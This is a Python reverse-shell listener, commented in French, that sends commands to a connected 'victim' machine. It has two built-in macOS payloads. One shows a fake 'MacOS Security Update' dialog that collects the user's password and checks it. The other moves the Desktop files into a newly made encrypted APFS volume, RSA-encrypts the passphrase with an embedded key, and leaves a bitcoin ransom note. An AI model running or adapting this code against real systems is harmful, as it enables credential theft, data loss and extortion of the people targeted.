import socket


# Démarre et gère les échanges TCP avec la victime. Les échanges peuvent être pipés vers une fonction (voir cb)
def startSocketServer(_host="0.0.0.0", _port=5050, cb=print):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((_host, _port))
        s.listen()
        cb(f'[*] Listening for reverse shell on {s.getsockname()}')
        client_socket, _ = s.accept()
        cb(f'[+] Got connection from {client_socket.getsockname()}')
        client_socket.settimeout(60)
        with client_socket:
            while True:
                command = input("~$: ")
                # Deux commandes personnalisées prédéfinies
                if command.lower() == 'phishing':
                    command = '''PWD_=$(osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null);if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) != "" ]];then while true; do PWD_=$(osascript -e 'display dialog "Incorrect password. Please try again" with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null); if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) == "" ]]; then break; fi; done fi; echo password : "'"$PWD_"'";'''
                elif command.lower() == 'ransom':
                    command = '''diskP=$(openssl rand -hex 63); echo OhNoItIsLocked Password : "'"$diskP"'"; diskutil ap addvolume disk1 apfs OhNoItIsLocked -passphrase "$diskP"; osascript -e 'tell app "Terminal"' -e 'do script "mv -f /Users/robertbebert/Desktop/* /Volumes/OhNoItIsLocked && diskutil umount OhNoItIsLocked"' -e 'end tell';sleep 10; base64 --decode <<< "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2bFFqa01tM0pVZC8xTW1GRm9mUwpRbXdTMFVvaHVQYXZHdVNocThNRHQ4d0xhR2dRNXY5N3BOOElWQ09DY0x3YzZxdEl3RU51eCtMdmdVMUxWQWVSCkN6bFBOaVFjaDhETHpSQVk2ektFUU1paThENVVack5JMzVwdm9nMWJRUmpoVlZ1TUFuQ0NOeU5Gd2tFKzdxc0kKOU9PblplSFZFOTBVYmtzMkVWQ0NqYXVhcVRGNXZYd1RqcTA5VTNGVVJ1UmlVZEg1RUVkV2gzbkNNMEJObUlQUgpsRC9QSnRreUFsenlCbVRTbTljcUlZVmhld1Z0NXN0OVlhMkxnNmZSbVNjL01zV29JOHU5MkdUTkhNU1FuTDBWCi9YdHhaY3FMVkZSNTd1clV2ZmZna0FqVThaV0JSbDRRUFhCc3BLZ1pSTklmUnlhSmlFWDJJMjg5YWlmVEFGUlgKUXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==" > ~/Desktop/pubK.pem;echo $diskP | openssl rsautl -encrypt -pubin -inkey ~/Desktop/pubK.pem > ~/Desktop/password.encrypted;echo 'If you can read this message, it means you have been badly hacked. Indeed, You might have seen that all of your precious files are gone. But be reassured, they are not really gone, at least for now. If you go into spotlight (the small magnifying glass in the top right of your screen) and enter "Disk Utility" you might see a new unmounted drive called "OhNoItIsLocked". This is the drive that contains your data. You can try to open by right-clicking on it and clicking on "mount" but, as you may see, this drive is encrypted and I am the only person who can get the key back, but not without a bit of teamwork with you.\n\nOn your Desktop stands a file called password.encrypted. With this file, I could easily get the password of your drive to help you unlock it. Sadly, I cannot work for free...\n\nIn short, send 0,000028 btc to this wallet (0x01234567890123456789) and send a telegram message to this number (0123456789) with a picture of the transaction and the file "password.encrypted" attached. I will then send you the key to decrypt your files.\n\nIt was a pleasure to work with you.\n\nKind regards\n\nMightyGoose' > ~/Desktop/READ_ME_IF_YOU_WANT_YOUR_FILES_BACK.txt;rm ~/Desktop/pubK.pem;'''
                client_socket.send((command + "\n").encode())
                if command.lower() == "exit":
                    break
                while True:
                    try:
                        results = client_socket.recv(2048*1024)
                        if results == 'bash-3.2$ '.encode():
                            break
                        cb(results.decode())
                    except:
                        break
            client_socket.close()
            s.close()
